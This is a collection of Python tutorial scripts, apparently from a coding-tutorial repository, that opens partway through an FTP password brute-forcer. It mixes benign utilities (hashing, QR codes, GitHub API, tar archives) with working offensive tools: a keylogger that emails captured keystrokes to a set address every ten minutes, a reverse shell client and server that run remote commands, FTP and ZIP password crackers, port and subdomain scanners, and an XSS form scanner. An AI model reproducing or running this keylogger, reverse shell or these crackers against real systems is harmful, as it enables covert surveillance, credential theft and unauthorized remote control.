        # get the password from the queue
        password = q.get()
        # initialize the FTP server object
        server = ftplib.FTP()
        print("[!] Trying", password)
        try:
            # tries to connect to FTP server with a timeout of 5
            server.connect(host, port, timeout=5)
            # login using the credentials (user & password)
            server.login(user, password)
        except ftplib.error_perm:
            # login failed, wrong credentials
            pass
        else:
            # correct credentials
            print(f"{Fore.GREEN}[+] Found credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: {password}{Fore.RESET}")
            # we found the password, let's clear the queue
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
        finally:
            # notify the queue that the task is completed for this password
            q.task_done()


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="FTP Cracker made with Python")
    parser.add_argument("host", help="The target host or IP address of the FTP server")
    parser.add_argument("-u", "--user", help="The username of target FTP server")
    parser.add_argument("-p", "--passlist", help="The path of the pass list")
    parser.add_argument("-t", "--threads", help="Number of workers to spawn for logining, default is 30", default=30)

    args = parser.parse_args()
    # hostname or IP address of the FTP server
    host = args.host
    # username of the FTP server, root as default for linux
    user = args.user
    passlist = args.passlist
    # number of threads to spawn
    n_threads = args.threads
    # read the wordlist of passwords
    passwords = open(passlist).read().split("\n")

    print("[+] Passwords to try:", len(passwords))

    # put all passwords to the queue
    for password in passwords:
        q.put(password)

    # create n_threads that runs that function
    for t in range(n_threads):
        thread = Thread(target=connect_ftp)
        # will end when the main thread end
        thread.daemon = True
        thread.start()
    # wait for the queue to be empty
    q.join()




import ftplib
from colorama import Fore, init # for fancy colors, nothing else

# init the console for colors (for Windows)
init()
# hostname or IP address of the FTP server
host = "192.168.1.113"
# username of the FTP server, root as default for linux
user = "test"
# port of FTP, aka 21
port = 21

def is_correct(password):
    # initialize the FTP server object
    server = ftplib.FTP()
    print(f"[!] Trying", password)
    try:
        # tries to connect to FTP server with a timeout of 5
        server.connect(host, port, timeout=5)
        # login using the credentials (user & password)
        server.login(user, password)
    except ftplib.error_perm:
        # login failed, wrong credentials
        return False
    else:
        # correct credentials
        print(f"{Fore.GREEN}[+] Found credentials:", password, Fore.RESET)
        return True


# read the wordlist of passwords
passwords = open("wordlist.txt").read().split("\n")
print("[+] Passwords to try:", len(passwords))

# iterate over passwords one by one
# if the password is found, break out of the loop
for password in passwords:
    if is_correct(password):
        break




import hashlib
import sys

def read_file(file):
    """Reads en entire file and returns file bytes."""
    BUFFER_SIZE = 16384 # 16 kilo bytes
    b = b""
    with open(file, "rb") as f:
        while True:
            # read 16K bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            if bytes_read:
                # if there is bytes, append them
                b += bytes_read
            else:
                # if not, nothing to do here, break out of the loop
                break
    return b

if __name__ == "__main__":
    # read some file
    file_content = read_file(sys.argv[1])
    # some chksums:
    # hash with MD5 (not recommended)
    print("MD5:", hashlib.md5(file_content).hexdigest())

    # hash with SHA-2 (SHA-256 & SHA-512)
    print("SHA-256:", hashlib.sha256(file_content).hexdigest())

    print("SHA-512:", hashlib.sha512(file_content).hexdigest())

    # hash with SHA-3
    print("SHA-3-256:", hashlib.sha3_256(file_content).hexdigest())

    print("SHA-3-512:", hashlib.sha3_512(file_content).hexdigest())

    # hash with BLAKE2
    # 256-bit BLAKE2 (or BLAKE2s)
    print("BLAKE2c:", hashlib.blake2s(file_content).hexdigest())
    # 512-bit BLAKE2 (or BLAKE2b)
    print("BLAKE2b:", hashlib.blake2b(file_content).hexdigest())




import hashlib

# encode it to bytes using UTF-8 encoding
message = "Some text to hash".encode()

# hash with MD5 (not recommended)
print("MD5:", hashlib.md5(message).hexdigest())

# hash with SHA-2 (SHA-256 & SHA-512)
print("SHA-256:", hashlib.sha256(message).hexdigest())

print("SHA-512:", hashlib.sha512(message).hexdigest())

# hash with SHA-3
print("SHA-3-256:", hashlib.sha3_256(message).hexdigest())

print("SHA-3-512:", hashlib.sha3_512(message).hexdigest())

# hash with BLAKE2
# 256-bit BLAKE2 (or BLAKE2s)
print("BLAKE2c:", hashlib.blake2s(message).hexdigest())
# 512-bit BLAKE2 (or BLAKE2b)
print("BLAKE2b:", hashlib.blake2b(message).hexdigest())




from PIL import Image
from PIL.ExifTags import TAGS
import sys

# path to the image or video
imagename = sys.argv[1]

# read the image data using PIL
image = Image.open(imagename)

# extract EXIF data
exifdata = image.getexif()

# iterating over all EXIF data fields
for tag_id in exifdata:
    # get the tag name, instead of human unreadable tag id
    tag = TAGS.get(tag_id, tag_id)
    data = exifdata.get(tag_id)
    # decode bytes 
    if isinstance(data, bytes):
        data = data.decode()
    print(f"{tag:25}: {data}")




import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Semaphore is for blocking the current thread
# Timer is to make a method runs after an interval amount of time
from threading import Semaphore, Timer

SEND_REPORT_EVERY = 600 # 10 minutes
EMAIL_ADDRESS = "put_real_address_heregmail.com"
EMAIL_PASSWORD = "put_real_pw"

class Keylogger:
    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all 
        # the keystrokes within self.interval
        self.log = ""
        # for blocking after setting the on_release listener
        self.semaphore = Semaphore(0)

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
    
    def sendmail(self, email, password, message):
        # manages a connection to an SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

    def report(self):
        """
        This function gets called every self.interval
        It basically sends keylogs and resets self.log variable
        """
        if self.log:
            # if there is something in log, report it
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            # can print to a file, whatever you want
            # print(self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread,
        # since on_release() doesn't block the current thread
        # if we don't block it, when we execute the program, nothing will happen
        # that is because on_release() will start the listener in a separate thread
        self.semaphore.acquire()

    
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()




import argparse
import socket # for connecting
from colorama import init, Fore

from threading import Thread, Lock
from queue import Queue

# some colors
init()
GREEN = Fore.GREEN
RESET = Fore.RESET
GRAY = Fore.LIGHTBLACK_EX

# number of threads, feel free to tune this parameter as you wish
N_THREADS = 200
# thread queue
q = Queue()
print_lock = Lock()

def port_scan(port):
    """
    Scan a port on the global variable host
    """
    try:
        s = socket.socket()
        s.connect((host, port))
    except:
        with print_lock:
            print(f"{GRAY}{host:15}:{port:5} is closed  {RESET}", end='\r')
    else:
        with print_lock:
            print(f"{GREEN}{host:15}:{port:5} is open    {RESET}")
    finally:
        s.close()


def scan_thread():
    global q
    while True:
        # get the port number from the queue
        worker = q.get()
        # scan that port number
        port_scan(worker)
        # tells the queue that the scanning for that port 
        # is done
        q.task_done()


def main(host, ports):
    global q
    for t in range(N_THREADS):
        # for each thread, start it
        t = Thread(target=scan_thread)
        # when we set daemon to true, that thread will end when the main thread ends
        t.daemon = True
        # start the daemon thread
        t.start()

    for worker in ports:
        # for each port, put that port into the queue
        # to start scanning
        q.put(worker)
    
    # wait the threads ( port scanners ) to finish
    q.join()


if __name__ == "__main__":
    # parse some parameters passed
    parser = argparse.ArgumentParser(description="Simple port scanner")
    parser.add_argument("host", help="Host to scan.")
    parser.add_argument("--ports", "-p", dest="port_range", default="1-65535", help="Port range to scan, default is 1-65535 (all ports)")
    args = parser.parse_args()
    host, port_range = args.host, args.port_range

    start_port, end_port = port_range.split("-")
    start_port, end_port = int(start_port), int(end_port)

    ports = [ p for p in range(start_port, end_port)]

    main(host, ports)




import socket # for connecting
from colorama import init, Fore

# some colors
init()
GREEN = Fore.GREEN
RESET = Fore.RESET
GRAY = Fore.LIGHTBLACK_EX

def is_port_open(host, port):
    """
    determine whether host has the port open
    """
    # creates a new socket
    s = socket.socket()
    try:
        # tries to connect to host using that port
        s.connect((host, port))
        # make timeout if you want it a little faster ( less accuracy )
        s.settimeout(0.2)
    except:
        # cannot connect, port is closed
        # return false
        return False
    else:
        # the connection was established, port is open!
        return True

# get the host from the user
host = input("Enter the host:")
# iterate over ports, from 1 to 1024
for port in range(1, 1025):
    if is_port_open(host, port):
        print(f"{GREEN}[+] {host}:{port} is open      {RESET}")
    else:
        print(f"{GRAY}[!] {host}:{port} is closed    {RESET}", end="\r")




import socket
import subprocess
import sys

SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 1024

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

# receive the greeting message
message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # execute the command and retrieve the results
    output = subprocess.getoutput(command)
    # send the results back to the server
    s.send(output.encode())
# close client connection
s.close()




import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003

BUFFER_SIZE = 1024

# create a socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))
# make the PORT reusable
# when you run the server multiple times in Linux, Address already in use error will raise
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# just sending a message, for demonstration purposes
message = "Hello and Welcome".encode()
client_socket.send(message)

while True:
    # get the command from prompt
    command = input("Enter the command you wanna execute:")
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    results = client_socket.recv(BUFFER_SIZE).decode()
    # print them
    print(results)
# close connection to the client
client_socket.close()
# close server connection
s.close()




import cv2
import numpy as np
import os

def to_bin(data):
    """Convert data to binary format as string"""
    if isinstance(data, str):
        return ''.join([ format(ord(i), "08b") for i in data ])
    elif isinstance(data, bytes) or isinstance(data, np.ndarray):
        return [ format(i, "08b") for i in data ]
    elif isinstance(data, int) or isinstance(data, np.uint8):
        return format(data, "08b")
    else:
        raise TypeError("Type not supported.")


def encode(image_name, secret_data):
    # read the image
    image = cv2.imread(image_name)
    # maximum bytes to encode
    n_bytes = image.shape[0] * image.shape[1] * 3 // 8
    print("[*] Maximum bytes to encode:", n_bytes)
    if len(secret_data) > n_bytes:
        raise ValueError("[!] Insufficient bytes, need bigger image or less data.")
    print("[*] Encoding data...")
    # add stopping criteria
    secret_data += "====="
    data_index = 0
    # convert data to binary
    binary_secret_data = to_bin(secret_data)
    # size of data to hide
    data_len = len(binary_secret_data)
    
    for row in image:
        for pixel in row:
            # convert RGB values to binary format
            r, g, b = to_bin(pixel)
            # modify the least significant bit only if there is still data to store
            if data_index < data_len:
                # least significant red pixel bit
                pixel[0] = int(r[:-1] + binary_secret_data[data_index], 2)
                data_index += 1
            if data_index < data_len:
                # least significant green pixel bit
                pixel[1] = int(g[:-1] + binary_secret_data[data_index], 2)
                data_index += 1
            if data_index < data_len:
                # least significant blue pixel bit
                pixel[2] = int(b[:-1] + binary_secret_data[data_index], 2)
                data_index += 1
            # if data is encoded, just break out of the loop
            if data_index >= data_len:
                break
    return image


def decode(image_name):
    print("[+] Decoding...")
    # read the image
    image = cv2.imread(image_name)
    binary_data = ""
    for row in image:
        for pixel in row:
            r, g, b = to_bin(pixel)
            binary_data += r[-1]
            binary_data += g[-1]
            binary_data += b[-1]

    # split by 8-bits
    all_bytes = [ binary_data[i: i+8] for i in range(0, len(binary_data), 8) ]
    # convert from bits to characters
    decoded_data = ""
    for byte in all_bytes:
        decoded_data += chr(int(byte, 2))
        if decoded_data[-5:] == "=====":
            break
    return decoded_data[:-5]


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Steganography encoder/decoder, this Python scripts encode data within images.")
    parser.add_argument("-t", "--text", help="The text data to encode into the image, this only should be specified for encoding")
    parser.add_argument("-e", "--encode", help="Encode the following image")
    parser.add_argument("-d", "--decode", help="Decode the following image")
    
    args = parser.parse_args()
    secret_data = args.text
    if args.encode:
        # if the encode argument is specified
        input_image = args.encode
        print("input_image:", input_image)
        # split the absolute path and the file
        path, file = os.path.split(input_image)
        # split the filename and the image extension
        filename, ext = file.split(".")
        output_image = os.path.join(path, f"{filename}_encoded.{ext}")
        # encode the data into the image
        encoded_image = encode(image_name=input_image, secret_data=secret_data)
        # save the output image (encoded image)
        cv2.imwrite(output_image, encoded_image)
        print("[+] Saved encoded image.")
    if args.decode:
        input_image = args.decode
        # decode the secret data from the image
        decoded_data = decode(input_image)
        print("[+] Decoded data:", decoded_data)




import requests
from threading import Thread
from queue import Queue

q = Queue()

def scan_subdomains(domain):
    global q
    while True:
        # get the subdomain from the queue
        subdomain = q.get()
        # scan the subdomain
        url = f"http://{subdomain}.{domain}"
        try:
            requests.get(url)
        except requests.ConnectionError:
            pass
        else:
            print("[+] Discovered subdomain:", url)

        # we're done with scanning that subdomain
        q.task_done()


def main(domain, n_threads, subdomains):
    global q

    # fill the queue with all the subdomains
    for subdomain in subdomains:
        q.put(subdomain)

    for t in range(n_threads):
        # start all threads
        worker = Thread(target=scan_subdomains, args=(domain,))
        # daemon thread means a thread that will end when the main thread ends
        worker.daemon = True
        worker.start()


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Faster Subdomain Scanner using Threads")
    parser.add_argument("domain", help="Domain to scan for subdomains without protocol (e.g without 'http://' or 'https://')")
    parser.add_argument("-l", "--wordlist", help="File that contains all subdomains to scan, line by line. Default is subdomains.txt",
                        default="subdomains.txt")
    parser.add_argument("-t", "--num-threads", help="Number of threads to use to scan the domain. Default is 10", default=10, type=int)
    
    args = parser.parse_args()
    domain = args.domain
    wordlist = args.wordlist
    num_threads = args.num_threads

    main(domain=domain, n_threads=num_threads, subdomains=open(wordlist).read().splitlines())
    q.join()




import requests

# the domain to scan for subdomains
domain = "google.com"

# read all subdomains
file = open("subdomains.txt")
# read all content
content = file.read()
# split by new lines
subdomains = content.splitlines()

for subdomain in subdomains:
    # construct the url
    url = f"http://{subdomain}.{domain}"
    try:
        # if this raises an ERROR, that means the subdomain does not exist
        requests.get(url)
    except requests.ConnectionError:
        # if the subdomain does not exist, just pass, print nothing
        pass
    else:
        print("[+] Discovered subdomain:", url)




import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin


def get_all_forms(url):
    """Given a url, it returns all forms from the HTML content"""
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    """
    This function extracts all possible useful information about an HTML form
    """
    details = {}
    # get the form action (target url)
    action = form.attrs.get("action").lower()
    # get the form method (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()
    # get all the input details such as type and name
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def submit_form(form_details, url, value):
    """
    Submits a form given in form_details
    Params:
        form_details (list): a dictionary that contain form information
        url (str): the original URL that contain that form
        value (str): this will be replaced to all text and search inputs
    Returns the HTTP Response after form submission
    """
    # construct the full URL (if the url provided in action is relative)
    target_url = urljoin(url, form_details["action"])
    # get the inputs
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        # replace all text and search values with value
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            # if input name and value are not None, 
            # then add them to the data of form submission
            data[input_name] = input_value

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        # GET request
        return requests.get(target_url, params=data)


def scan_xss(url):
    """
    Given a url, it prints all XSS vulnerable forms and 
    returns True if any is vulnerable, False otherwise
    """
    # get all the forms from the URL
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    js_script = "<Script>alert('hi')</scripT>"
    # returning value
    is_vulnerable = False
    # iterate over all forms
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, js_script).content.decode()
        if js_script in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            pprint(form_details)
            is_vulnerable = True
            # won't break because we want to print other available vulnerable forms
    return is_vulnerable


if __name__ == "__main__":
    import sys
    url = sys.argv[1]
    print(scan_xss(url))




from tqdm import tqdm

import zipfile
import sys

# the password list path you want to use
wordlist = sys.argv[2]
# the zip file you want to crack its password
zip_file = sys.argv[1]
# initialize the Zip File object
zip_file = zipfile.ZipFile(zip_file)
# count the number of words in this wordlist
n_words = len(list(open(wordlist, "rb")))
# print the total number of passwords
print("Total passwords to test:", n_words)
with open(wordlist, "rb") as wordlist:
    for word in tqdm(wordlist, total=n_words, unit="word"):
        try:
            zip_file.extractall(pwd=word.strip())
        except:
            continue
        else:
            print("[+] Password found:", word.decode().strip())
            exit(0)
print("[!] Password not found, try other wordlist.")




import requests
from pprint import pprint

# email and password
auth = ("emailexample.com", "ffffffff")

# get the HTTP Response
res = requests.get("https://secure.veesp.com/api/details", auth=auth)

# get the account details
account_details = res.json()

pprint(account_details)

# get the bought services
services = requests.get('https://secure.veesp.com/api/service', auth=auth).json()
pprint(services)

# get the upgrade options
upgrade_options = requests.get('https://secure.veesp.com/api/service/32723/upgrade', auth=auth).json()
pprint(upgrade_options)

# list all bought VMs
all_vms = requests.get("https://secure.veesp.com/api/service/32723/vms", auth=auth).json()
pprint(all_vms)

# stop a VM automatically
stopped = requests.post("https://secure.veesp.com/api/service/32723/vms/18867/stop", auth=auth).json()
print(stopped)
# {'status': True}

# start it again
started = requests.post("https://secure.veesp.com/api/service/32723/vms/18867/start", auth=auth).json()
print(started)
# {'status': True}




import os
import matplotlib.pyplot as plt


def get_size_format(b, factor=1024, suffix="B"):
    """
    Scale bytes to its proper byte format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    for unit in ["", "K", "M", "G", "T", "P", "E", "Z"]:
        if b < factor:
            return f"{b:.2f}{unit}{suffix}"
        b /= factor
    return f"{b:.2f}Y{suffix}"


def get_directory_size(directory):
    """Returns the directory size in bytes."""
    total = 0
    try:
        # print("[+] Getting the size of", directory)
        for entry in os.scandir(directory):
            if entry.is_file():
                # if it's a file, use stat() function
                total += entry.stat().st_size
            elif entry.is_dir():
                # if it's a directory, recursively call this function
                total += get_directory_size(entry.path)
    except NotADirectoryError:
        # if directory isn't a directory, get the file size then
        return os.path.getsize(directory)
    except PermissionError:
        # if for whatever reason we can't open the folder, return 0
        return 0
    return total


def plot_pie(sizes, names):
    """Plots a pie where sizes is the wedge sizes and names """
    plt.pie(sizes, labels=names, autopct=lambda pct: f"{pct:.2f}%")
    plt.title("Different Sub-directory sizes in bytes")
    plt.show()


if __name__ == "__main__":
    import sys
    folder_path = sys.argv[1]

    directory_sizes = []
    names = []
    # iterate over all the directories inside this path
    for directory in os.listdir(folder_path):
        directory = os.path.join(folder_path, directory)
        # get the size of this directory (folder)
        directory_size = get_directory_size(directory)
        if directory_size == 0:
            continue
        directory_sizes.append(directory_size)
        names.append(os.path.basename(directory) + ": " + get_size_format(directory_size))

    print("[+] Total directory size:", get_size_format(sum(directory_sizes)))
    plot_pie(directory_sizes, names)




import tarfile
from tqdm import tqdm # pip3 install tqdm


def decompress(tar_file, path, members=None):
    """
    Extracts tar_file and puts the members to path.
    If members is None, all members on tar_file will be extracted.
    """
    tar = tarfile.open(tar_file, mode="r:gz")
    if members is None:
        members = tar.getmembers()
    # with progress bar
    # set the progress bar
    progress = tqdm(members)
    for member in progress:
        tar.extract(member, path=path)
        # set the progress description of the progress bar
        progress.set_description(f"Extracting {member.name}")
    # or use this
    # tar.extractall(members=members, path=path)
    # close the file
    tar.close()


def compress(tar_file, members):
    """
    Adds files (members) to a tar_file and compress it
    """
    # open file for gzip compressed writing
    tar = tarfile.open(tar_file, mode="w:gz")
    # with progress bar
    # set the progress bar
    progress = tqdm(members)
    for member in progress:
        # add file/folder/link to the tar file (compress)
        tar.add(member)
        # set the progress description of the progress bar
        progress.set_description(f"Compressing {member}")
    # close the file
    tar.close()


# compress("compressed.tar.gz", ["test.txt", "test_folder"])
# decompress("compressed.tar.gz", "extracted")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="TAR file compression/decompression using GZIP.")
    parser.add_argument("method", help="What to do, either 'compress' or 'decompress'")
    parser.add_argument("-t", "--tarfile", help="TAR file to compress/decompress, if it isn't specified for compression, the new TAR file will be named after the first file to compress.")
    parser.add_argument("-p", "--path", help="The folder to compress into, this is only for decompression. Default is '.' (the current directory)", default="")
    parser.add_argument("-f", "--files", help="File(s),Folder(s),Link(s) to compress/decompress separated by ','.")

    args = parser.parse_args()
    method = args.method
    tar_file = args.tarfile
    path = args.path
    files = args.files

    # split by ',' to convert into a list
    files = files.split(",") if isinstance(files, str) else None

    if method.lower() == "compress":
        if not files:
            print("Files to compress not provided, exiting...")
            exit(1)
        elif not tar_file:
            # take the name of the first file
            tar_file = f"{files[0]}.tar.gz"
        compress(tar_file, files)
    elif method.lower() == "decompress":
        if not tar_file:
            print("TAR file to decompress is not provided, nothing to do, exiting...")
            exit(2)
        decompress(tar_file, path, files)
    else:
        print("Method not known, please use 'compress/decompress'.")




import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.audio import MIME

# your credentials
email = "emailexample.com"
password = "password"

# the sender's email
FROM = "emailexample.com"
# the receiver's email
TO   = "toexample.com"
# the subject of the email (subject)
subject = "Just a subject"

# initialize the message we wanna send
msg = MIMEMultipart()
# set the sender's email
msg["From"] = FROM
# set the receiver's email
msg["To"] = TO
# set the subject
msg["Subject"] = subject
# set the body of the email
text = MIMEText("This email is sent using <b>Python</b> !", "html")
# attach this body to the email
msg.attach(text)
# initialize the SMTP server
server = smtplib.SMTP("smtp.gmail.com", 587)
# connect to the SMTP server as TLS mode (secure) and send EHLO
server.starttls()
# login to the account using the credentials
server.login(email, password)
# send the email
server.sendmail(FROM, TO, msg.as_string())
# terminate the SMTP session
server.quit()




import paramiko
import argparse

parser = argparse.ArgumentParser(description="Python script to execute BASH scripts on Linux boxes remotely.")
parser.add_argument("host", help="IP or domain of SSH Server")
parser.add_argument("-u", "--user", required=True, help="The username you want to access to.")
parser.add_argument("-p", "--password", required=True, help="The password of that user")
parser.add_argument("-b", "--bash", required=True, help="The BASH script you wanna execute")

args = parser.parse_args()
hostname = args.host
username = args.user
password = args.password
bash_script = args.bash

# initialize the SSH client
client = paramiko.SSHClient()
# add to known hosts
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
    client.connect(hostname=hostname, username=username, password=password)
except:
    print("[!] Cannot connect to the SSH Server")
    exit()

# read the BASH script content from the file
bash_script = open(bash_script).read()
# execute the BASH script
stdin, stdout, stderr = client.exec_command(bash_script)
# read the standard output and print it
print(stdout.read().decode())
# print errors if there are any
err = stderr.read().decode()
if err:
    print(err)
# close the connection
client.close()




import paramiko

hostname = "192.168.1.101"
username = "test"
password = "abc123"

commands = [
    "pwd",
    "id",
    "uname -a",
    "df -h"
]

# initialize the SSH client
client = paramiko.SSHClient()
# add to known hosts
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
    client.connect(hostname=hostname, username=username, password=password)
except:
    print("[!] Cannot connect to the SSH Server")
    exit()

# execute the commands
for command in commands:
    print("="*50, command, "="*50)
    stdin, stdout, stderr = client.exec_command(command)
    print(stdout.read().decode())
    err = stderr.read().decode()
    if err:
        print(err)
    

client.close()




from tqdm import tqdm
import requests
import sys

# the url of file you want to download, passed from command line arguments
url = sys.argv[1]
# read 1024 bytes every time 
buffer_size = 1024
# download the body of response by chunk, not immediately
response = requests.get(url, stream=True)

# get the total file size
file_size = int(response.headers.get("Content-Length", 0))

# get the file name
filename = url.split("/")[-1]

# progress bar, changing the unit to bytes instead of iteration (default by tqdm)
progress = tqdm(response.iter_content(buffer_size), f"Downloading {filename}", total=file_size, unit="B", unit_scale=True, unit_divisor=1024)
with open(filename, "wb") as f:
    for data in progress:
        # write data read to the file
        f.write(data)
        # update the progress bar manually
        progress.update(len(data))




import qrcode
import sys

data = sys.argv[1]
filename = sys.argv[2]

# generate qr code
img = qrcode.make(data)
# save img to a file
img.save(filename)




import cv2
import sys

filename = sys.argv[1]

# read the QRCODE image
img = cv2.imread(filename)

# initialize the cv2 QRCode detector
detector = cv2.QRCodeDetector()

# detect and decode
data, bbox, straight_qrcode = detector.detectAndDecode(img)

# if there is a QR code
if bbox is not None:
    print(f"QRCode data:\n{data}")
    # display the image with lines
    # length of bounding box
    n_lines = len(bbox)
    for i in range(n_lines):
        # draw all lines
        point1 = tuple(bbox[i][0])
        point2 = tuple(bbox[(i+1) % n_lines][0])
        cv2.line(img, point1, point2, color=(255, 0, 0), thickness=2)



# display the result
cv2.imshow("img", img)
cv2.waitKey(0)
cv2.destroyAllWindows()




import cv2

# initalize the cam
cap = cv2.VideoCapture(0)

# initialize the cv2 QRCode detector
detector = cv2.QRCodeDetector()

while True:
    _, img = cap.read()

    # detect and decode
    data, bbox, _ = detector.detectAndDecode(img)

    # check if there is a QRCode in the image
    if bbox is not None:
        # display the image with lines
        for i in range(len(bbox)):
            # draw all lines
            cv2.line(img, tuple(bbox[i][0]), tuple(bbox[(i+1) % len(bbox)][0]), color=(255, 0, 0), thickness=2)

        if data:
            print("[+] QR Code detected, data:", data)

    # display the result
    cv2.imshow("img", img)
    
    if cv2.waitKey(1) == ord("q"):
        break

cap.release()
cv2.destroyAllWindows()




from github import Github

# your github account credentials
username = "username"
password = "password"
# initialize github object
g = Github(username, password)

# searching for my repository
repo = g.search_repositories("pythoncode tutorials")[0]

# create a file and commit n push
repo.create_file("test.txt", "commit message", "content of the file")

# delete that created file
contents = repo.get_contents("test.txt")
repo.delete_file(contents.path, "remove test.txt", contents.sha)




import requests
from pprint import pprint

# github username
username = "x4nth055"
# url to request
url = f"https://api.github.com/users/{username}"
# make the request and return the json
user_data = requests.get(url).json()
# pretty print JSON data
pprint(user_data)
# get name
name = user_data["name"]
# get blog url if there is
blog = user_data["blog"]
# extract location
location = user_data["location"]
# get email address that is publicly available
email = user_data["email"]
# number of public repositories
public_repos = user_data["public_repos"]
# get number of public gists
public_gists = user_data["public_gists"]
# number of followers
followers = user_data["followers"]
# number of following
following = user_data["following"]
# date of account creation
date_created = user_data["created_at"]
# date of account last update
date_updated = user_data["updated_at"]
# urls
followers_url = user_data["followers_url"]
following_url = user_data["following_url"]

# print all
print("User:", username)
print("Name:", name)
print("Blog:", blog)
print("Location:", location)
print("Email:", email)
print("Total Public repositories:", public_repos)
print("Total Public Gists:", public_gists)
print("Total followers:", followers)
print("Total following:", following)
print("Date Created:", date_created)
print("Date Updated:", date_updated)




import base64
from github import Github
import sys


def print_repo(repo):
    # repository full name
    print("Full name:", repo.full_name)
    # repository description
    print("Description:", repo.description)
    # the date of when the repo was created
    print("Date created:", repo.created_at)
    # the date of the last git push
    print("Date of last push:", repo.pushed_at)
    # home website (if available)
    print("Home Page:", repo.homepage)
    # programming language
    print("Language:", repo.language)
    # number of forks
    print("Number of forks:", repo.forks)
    # number of stars
    print("Number of stars:", repo.stargazers_count)
    print("-"*50)
    # repository content (files & directories)
    print("Contents:")
    for content in repo.get_contents(""):
        print(content)
    try:
        # repo license
        print("License:", base64.b64decode(repo.get_license().content.encode()).decode())
    except:
        pass
    
    
# Github username from the command line
username = sys.argv[1]
# pygithub object
g = Github()
# get that user by username
user = g.get_user(username)
# iterate over all public repositories
for repo in user.get_repos():
    print_repo(repo)
    print("="*100)




from github import Github
import base64

def print_repo(repo):
    # repository full name
    print("Full name:", repo.full_name)
    # repository description
    print("Description:", repo.description)
    # the date of when the repo was created
    print("Date created:", repo.created_at)
    # the date of the last git push
    print("Date of last push:", repo.pushed_at)
    # home website (if available)
    print("Home Page:", repo.homepage)
    # programming language
    print("Language:", repo.language)
    # number of forks
    print("Number of forks:", repo.forks)
    # number of stars
    print("Number of stars:", repo.stargazers_count)
    print("-"*50)
    # repository content (files & directories)
    print("Contents:")
    for content in repo.get_contents(""):
        print(content)
    try:
        # repo license
        print("License:", base64.b64decode(repo.get_license().content.encode()).decode())
    except:
        pass

# your github account credentials
username = "username"
password = "password"
# initialize github object
g = Github(username, password)
# or use public version
# g = Github()

# search repositories by name
for repo in g.search_repositories("pythoncode tutorials"):
    # print repository details
    print_repo(repo)
    print("="*100)

print("="*100)
print("="*100)

# search by programming language
for i, repo in enumerate(g.search_repositories("language:python")):
    print_repo(repo)
    print("="*100)
    if i == 9:
        break




import ipaddress
# initialize an IPv4 Address
ip = ipaddress.IPv4Address("192.168.1.1")

# print True if the IP address is global
print("Is global:", ip.is_global)

# print Ture if the IP address is Link-local
print("Is link-local:", ip.is_link_local)

# ip.is_reserved
# ip.is_multicast

# next ip address
print(ip + 1)

# previous ip address
print(ip - 1)

# initialize an IPv4 Network
